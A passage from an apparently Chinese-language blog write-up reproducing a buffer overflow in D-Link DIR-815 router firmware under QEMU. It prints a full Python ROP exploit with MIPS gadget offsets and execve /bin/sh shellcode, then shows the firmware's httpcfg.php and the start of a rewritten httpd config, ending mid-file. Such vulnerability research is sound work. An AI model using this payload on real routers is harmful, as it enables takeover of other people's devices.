<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/0x1DD08.png" alt=""></p>
<p>到这里所有的gadget都找齐了。</p>
<p>5.构造exp</p>
<p>整个payload是这样的：</p>
<p>这里顺便提下构造exp时有可能的坏字符：0x20（空格）、0x00（结束符）、0x3a（冒号）、0x3f（问号）、0x3b（分号）、0x0a(\n换行符)等。具体还要看程序如何处理以及转义。</p>
<pre class=" language-python"><code class="language-python">libc_base <span class="token operator">=</span> <span class="token number">0x76738000</span>
sleep <span class="token operator">=</span> <span class="token number">0x56BD0</span>
gadget1 <span class="token operator">=</span> <span class="token number">0x57E50</span>
gadget2 <span class="token operator">=</span> <span class="token number">0x3B8A8</span>
gadget3 <span class="token operator">=</span> <span class="token number">0x14F28</span>
gadget4 <span class="token operator">=</span> <span class="token number">0x1DD08</span>

<span class="token comment" spellcheck="true"># Linux/MIPS - execve /bin/sh - 48 bytes</span>
shellcode <span class="token operator">=</span> <span class="token string">"\xff\xff\x06\x28"</span>  <span class="token comment" spellcheck="true"># slti $a2, $zero, -1</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\x62\x69\x0f\x3c"</span>  <span class="token comment" spellcheck="true"># lui $t7, 0x6962</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\x2f\x2f\xef\x35"</span>  <span class="token comment" spellcheck="true"># ori $t7, $t7, 0x2f2f</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\xf4\xff\xaf\xaf"</span>  <span class="token comment" spellcheck="true"># sw $t7, -0xc($sp)</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\x73\x68\x0e\x3c"</span>  <span class="token comment" spellcheck="true"># lui $t6, 0x6873</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\x6e\x2f\xce\x35"</span>  <span class="token comment" spellcheck="true"># ori $t6, $t6, 0x2f6e</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\xf8\xff\xae\xaf"</span>  <span class="token comment" spellcheck="true"># sw $t6, -8($sp)</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\xfc\xff\xa0\xaf"</span>  <span class="token comment" spellcheck="true"># sw $zero, -4($sp)</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\xf4\xff\xa4\x27"</span>  <span class="token comment" spellcheck="true"># addiu $a0, $sp, -0xc</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\xff\xff\x05\x28"</span>  <span class="token comment" spellcheck="true"># slti $a1, $zero, -1</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\xab\x0f\x02\x24"</span>  <span class="token comment" spellcheck="true"># addiu;$v0, $zero, 0xfab</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\x0c\x01\x01\x01"</span>  <span class="token comment" spellcheck="true"># syscall 0x40404</span>

payload <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x3cd</span>
payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                           <span class="token comment" spellcheck="true"># s0</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget2<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># s1 = mipsrop.tail() &amp;&amp; move $ra,$(sp+0x24) &amp;&amp; jr s2</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> sleep<span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># s2 = jr $(sp+0x24)</span>
payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s3</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget4<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># s4 = mipsrop.find("move $t9,$s1") &amp;&amp; jr shellcode</span>
payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                           <span class="token comment" spellcheck="true"># s5</span>
payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s6</span>
payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s7</span>
payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># fp</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget1<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># fisrt_ra = mipsrop.find("li $a0,1") &amp;&amp; jr s1</span>
payload <span class="token operator">+=</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">0x24</span> <span class="token comment" spellcheck="true"># mipsrop.tail() 0x24B padding</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget3<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># $(sp+0x24) = mipsrop.stackfinder() &amp;&amp; move s1,$(sp+0x18) &amp;&amp; jr $s4</span>

payload <span class="token operator">+=</span> <span class="token string">'c'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token comment" spellcheck="true"># mipsrop.stackfinder() 0x18B padding</span>
payload <span class="token operator">+=</span> shellcode</code></pre>
<p>调试结果显示能够进入到Shellcode去执行。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/shellcode.png" alt=""></p>
<p>但是之后一直出不去，获取不到shell。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/shellcode2.png" alt=""></p>
<p>所以到目前为止，利用qemu用户模式还没有成功获取shell！！！</p>
<h1 id="05-qemu系统模式"><a href="#05-qemu系统模式" class="headerlink" title="05-qemu系统模式"></a>05-qemu系统模式</h1><p>我们这里主要是为了在qemu虚拟机中重现http服务。通过查看文件系统中的<code>/bin、/sbin、/usr/bin、/usr/sbin</code>可以知道<code>/sbin/httpd</code>应该是用于监听web端口的http服务，同时查看<code>/htdocs/web</code>文件夹下的cgi文件和php文件，可以了解到接受到的数据通过php+cgi来处理并返回客户端。</p>
<h2 id="5-1-环境配置"><a href="#5-1-环境配置" class="headerlink" title="5.1-环境配置"></a>5.1-环境配置</h2><p><code>find ./ -name '*http*'</code>找到web配置文件httpcfg.php。</p>
<pre class=" language-sh"><code class="language-sh">./etc/services/HTTP/httpcfg.php
./etc/services/HTTP/httpsvcs.php
./usr/sbin/httpc
./sbin/httpd</code></pre>
<p>查看httpcf.php</p>
<pre class=" language-php"><code class="language-php">Umask <span class="token number">026</span>
PIDFile <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>run<span class="token operator">/</span>httpd<span class="token punctuation">.</span>pid
<span class="token shell-comment comment">#LogGMT On</span>
<span class="token shell-comment comment">#ErrorLog /dev/console</span>

Tuning
<span class="token punctuation">{</span>
    NumConnections <span class="token number">15</span>
    BufSize <span class="token number">12288</span>
    InputBufSize <span class="token number">4096</span>
    ScriptBufSize <span class="token number">4096</span>
    NumHeaders <span class="token number">100</span>
    Timeout <span class="token number">60</span>
    ScriptTimeout <span class="token number">60</span>
<span class="token punctuation">}</span>

Control
<span class="token punctuation">{</span>
    Types
    <span class="token punctuation">{</span>
        text<span class="token operator">/</span>html    <span class="token punctuation">{</span> html htm <span class="token punctuation">}</span>
        text<span class="token operator">/</span>xml    <span class="token punctuation">{</span> xml <span class="token punctuation">}</span>
        text<span class="token operator">/</span>plain    <span class="token punctuation">{</span> txt <span class="token punctuation">}</span>
        image<span class="token operator">/</span>gif    <span class="token punctuation">{</span> gif <span class="token punctuation">}</span>
        image<span class="token operator">/</span>jpeg    <span class="token punctuation">{</span> jpg <span class="token punctuation">}</span>
        text<span class="token operator">/</span>css    <span class="token punctuation">{</span> css <span class="token punctuation">}</span>
        application<span class="token operator">/</span>octet<span class="token operator">-</span>stream <span class="token punctuation">{</span> <span class="token operator">*</span> <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    Specials
    <span class="token punctuation">{</span>
        Dump        <span class="token punctuation">{</span> <span class="token operator">/</span>dump <span class="token punctuation">}</span>
        <span class="token constant">CGI</span>            <span class="token punctuation">{</span> cgi <span class="token punctuation">}</span>
        Imagemap    <span class="token punctuation">{</span> map <span class="token punctuation">}</span>
        Redirect    <span class="token punctuation">{</span> url <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    External
    <span class="token punctuation">{</span>
        <span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>phpcgi <span class="token punctuation">{</span> php <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token delimiter">&lt;?</span>
<span class="token keyword">include</span> <span class="token string">"/htdocs/phplib/phyinf.php"</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">http_server</span><span class="token punctuation">(</span><span class="token variable">$sname</span><span class="token punctuation">,</span> <span class="token variable">$uid</span><span class="token punctuation">,</span> <span class="token variable">$ifname</span><span class="token punctuation">,</span> <span class="token variable">$af</span><span class="token punctuation">,</span> <span class="token variable">$ipaddr</span><span class="token punctuation">,</span> <span class="token variable">$port</span><span class="token punctuation">,</span> <span class="token variable">$hnap</span><span class="token punctuation">,</span> <span class="token variable">$widget</span><span class="token punctuation">,</span> <span class="token variable">$smart404</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">echo</span>
        <span class="token string">"Server"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"{"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    ServerName \""</span><span class="token punctuation">.</span><span class="token variable">$sname</span><span class="token punctuation">.</span><span class="token string">"\""</span><span class="token punctuation">.</span>                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    ServerId \""</span><span class="token punctuation">.</span><span class="token variable">$uid</span><span class="token punctuation">.</span><span class="token string">"\""</span><span class="token punctuation">.</span>                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Family "</span><span class="token punctuation">.</span><span class="token variable">$af</span><span class="token punctuation">.</span>                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Interface "</span><span class="token punctuation">.</span><span class="token variable">$ifname</span><span class="token punctuation">.</span>                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Address "</span><span class="token punctuation">.</span><span class="token variable">$ipaddr</span><span class="token punctuation">.</span>                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Port "</span><span class="token punctuation">.</span><span class="token variable">$port</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Virtual"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    {"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        AnyHost"</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        Control"</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        {"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            Alias /"</span><span class="token punctuation">.</span>                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            Location /htdocs/web"</span><span class="token punctuation">.</span>            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            IndexNames { index.php }"</span><span class="token punctuation">.</span>        <span class="token string">"\n"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$uid</span><span class="token operator">==</span><span class="token string">"LAN-1"</span><span class="token operator">||</span><span class="token variable">$uid</span><span class="token operator">==</span><span class="token string">"WAN-1"</span><span class="token punctuation">)</span>    <span class="token keyword">echo</span>
        <span class="token string">"            External"</span><span class="token punctuation">.</span>                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            {"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"                /usr/sbin/phpcgi { txt }"</span><span class="token punctuation">.</span>    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            }"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$widget</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">echo</span>
        <span class="token string">"            External"</span><span class="token punctuation">.</span>                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            {"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"                /usr/sbin/phpcgi { router_info.xml }"</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"                /usr/sbin/phpcgi { post_login.xml }"</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            }"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">;</span>    
    <span class="token keyword">echo</span>
        <span class="token string">"        }"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$smart404</span> <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">echo</span>
        <span class="token string">'       Control'</span><span class="token punctuation">.</span>                           <span class="token string">'\n'</span><span class="token punctuation">.</span>
        <span class="token string">'       {'</span><span class="token punctuation">.</span>                                 <span class="token string">'\n'</span><span class="token punctuation">.</span>
        <span class="token string">'           Alias /smart404'</span><span class="token punctuation">.</span>               <span class="token string">'\n'</span><span class="token punctuation">.</span>
        <span class="token string">'           Location /htdocs/smart404'</span><span class="token punctuation">.</span>     <span class="token string">'\n'</span><span class="token punctuation">.</span>
        <span class="token string">'       }'</span><span class="token punctuation">.</span>                                 <span class="token string">'\n'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hnap</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">echo</span>
        <span class="token string">"        Control"</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        {"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            Alias /HNAP1"</span><span class="token punctuation">.</span>                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            Location /htdocs/HNAP1"</span><span class="token punctuation">.</span>        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            External"</span><span class="token punctuation">.</span>                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            {"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"                /usr/sbin/hnap { hnap }"</span><span class="token punctuation">.</span>    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            }"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            IndexNames { index.hnap }"</span><span class="token punctuation">.</span>        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        }"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">echo</span>
        <span class="token string">"    }"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"}"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">ssdp_server</span><span class="token punctuation">(</span><span class="token variable">$sname</span><span class="token punctuation">,</span> <span class="token variable">$uid</span><span class="token punctuation">,</span> <span class="token variable">$ifname</span><span class="token punctuation">,</span> <span class="token variable">$af</span><span class="token punctuation">,</span> <span class="token variable">$ipaddr</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$af</span><span class="token operator">==</span><span class="token string">"inet6"</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span>
        <span class="token string">"Server"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"{"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    ServerName \""</span><span class="token punctuation">.</span><span class="token variable">$sname</span><span class="token punctuation">.</span><span class="token string">"\""</span><span class="token punctuation">.</span>                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    ServerId \""</span><span class="token punctuation">.</span><span class="token variable">$uid</span><span class="token punctuation">.</span><span class="token string">"\""</span><span class="token punctuation">.</span>                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Family "</span><span class="token punctuation">.</span><span class="token variable">$af</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Interface "</span><span class="token punctuation">.</span><span class="token variable">$ifname</span><span class="token punctuation">.</span>                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Port 1900"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Address 239.255.255.250"</span><span class="token punctuation">.</span>                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Datagrams On"</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Virtual"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    {"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        AnyHost"</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        Control"</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        {"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            Alias /"</span><span class="token punctuation">.</span>                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            Location /htdocs/upnp/docs/"</span><span class="token punctuation">.</span><span class="token variable">$uid</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            External"</span><span class="token punctuation">.</span>                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            {"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"                /htdocs/upnp/ssdpcgi { * }"</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            }"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        }"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    }"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"}"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">upnp_server</span><span class="token punctuation">(</span><span class="token variable">$sname</span><span class="token punctuation">,</span> <span class="token variable">$uid</span><span class="token punctuation">,</span> <span class="token variable">$ifname</span><span class="token punctuation">,</span> <span class="token variable">$af</span><span class="token punctuation">,</span> <span class="token variable">$ipaddr</span><span class="token punctuation">,</span> <span class="token variable">$port</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$af</span><span class="token operator">==</span><span class="token string">"inet6"</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span>
        <span class="token string">"Server"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"{"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    ServerName \""</span><span class="token punctuation">.</span><span class="token variable">$sname</span><span class="token punctuation">.</span><span class="token string">"\""</span><span class="token punctuation">.</span>                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    ServerId \""</span><span class="token punctuation">.</span><span class="token variable">$uid</span><span class="token punctuation">.</span><span class="token string">"\""</span><span class="token punctuation">.</span>                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Family "</span><span class="token punctuation">.</span><span class="token variable">$af</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Interface "</span><span class="token punctuation">.</span><span class="token variable">$ifname</span><span class="token punctuation">.</span>                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Address "</span><span class="token punctuation">.</span><span class="token variable">$ipaddr</span><span class="token punctuation">.</span>                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Port "</span><span class="token punctuation">.</span><span class="token variable">$port</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Virtual"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    {"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        AnyHost"</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        Control"</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        {"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            Alias /"</span><span class="token punctuation">.</span>                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            Location /htdocs/upnp/docs/"</span><span class="token punctuation">.</span><span class="token variable">$uid</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        }"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    }"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"}"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token string">"/runtime/services/http/server"</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$model</span>    <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"/runtime/device/modelname"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$ver</span>    <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"/runtime/device/firmwareversion"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$smart404</span> <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"/runtime/smart404"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sname</span>    <span class="token operator">=</span> <span class="token string">"Linux, HTTP/1.1, "</span><span class="token punctuation">.</span><span class="token variable">$model</span><span class="token punctuation">.</span><span class="token string">" Ver "</span><span class="token punctuation">.</span><span class="token variable">$ver</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* HTTP server name */</span>
    <span class="token variable">$suname</span> <span class="token operator">=</span> <span class="token string">"Linux, UPnP/1.0, "</span><span class="token punctuation">.</span><span class="token variable">$model</span><span class="token punctuation">.</span><span class="token string">" Ver "</span><span class="token punctuation">.</span><span class="token variable">$ver</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* UPnP server name */</span>
    <span class="token variable">$mode</span>     <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"mode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$inf</span>    <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"inf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$ifname</span>    <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"ifname"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$ipaddr</span>    <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"ipaddr"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$port</span>    <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"port"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$hnap</span>    <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"hnap"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$widget</span> <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"widget"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$af</span>        <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"af"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$af</span><span class="token operator">!=</span><span class="token string">""</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$ifname</span><span class="token operator">!=</span><span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span>        <span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token operator">==</span><span class="token string">"HTTP"</span><span class="token punctuation">)</span> <span class="token function">http_server</span><span class="token punctuation">(</span><span class="token variable">$sname</span><span class="token punctuation">,</span> <span class="token variable">$inf</span><span class="token punctuation">,</span><span class="token variable">$ifname</span><span class="token punctuation">,</span><span class="token variable">$af</span><span class="token punctuation">,</span><span class="token variable">$ipaddr</span><span class="token punctuation">,</span><span class="token variable">$port</span><span class="token punctuation">,</span><span class="token variable">$hnap</span><span class="token punctuation">,</span><span class="token variable">$widget</span><span class="token punctuation">,</span><span class="token variable">$smart404</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span>    <span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token operator">==</span><span class="token string">"SSDP"</span><span class="token punctuation">)</span> <span class="token function">ssdp_server</span><span class="token punctuation">(</span><span class="token variable">$sname</span><span class="token punctuation">,</span> <span class="token variable">$inf</span><span class="token punctuation">,</span><span class="token variable">$ifname</span><span class="token punctuation">,</span><span class="token variable">$af</span><span class="token punctuation">,</span><span class="token variable">$ipaddr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span>    <span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token operator">==</span><span class="token string">"UPNP"</span><span class="token punctuation">)</span> <span class="token function">upnp_server</span><span class="token punctuation">(</span><span class="token variable">$suname</span><span class="token punctuation">,</span><span class="token variable">$inf</span><span class="token punctuation">,</span><span class="token variable">$ifname</span><span class="token punctuation">,</span><span class="token variable">$af</span><span class="token punctuation">,</span><span class="token variable">$ipaddr</span><span class="token punctuation">,</span><span class="token variable">$port</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token delimiter">?></span></code></pre>
<p>可以了解到该php用于生成配置文件，由于我们只需要其中的http服务，可以按照该配置文件改写我们所需的conf。</p>
<pre class=" language-php"><code class="language-php">Umask <span class="token number">026</span>
PIDFile <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>run<span class="token operator">/</span>httpd<span class="token punctuation">.</span>pid
LogGMT On  <span class="token shell-comment comment">#开启log</span>
ErrorLog <span class="token operator">/</span>log <span class="token shell-comment comment">#log文件</span>

Tuning
<span class="token punctuation">{</span>
    NumConnections <span class="token number">15</span>
    BufSize <span class="token number">12288</span>
    InputBufSize <span class="token number">4096</span>
    ScriptBufSize <span class="token number">4096</span>
    NumHeaders <span class="token number">100</span>
    Timeout <span class="token number">60</span>
    ScriptTimeout <span class="token number">60</span>
<span class="token punctuation">}</span>

Control
<span class="token punctuation">{</span>
    Types
    <span class="token punctuation">{</span>
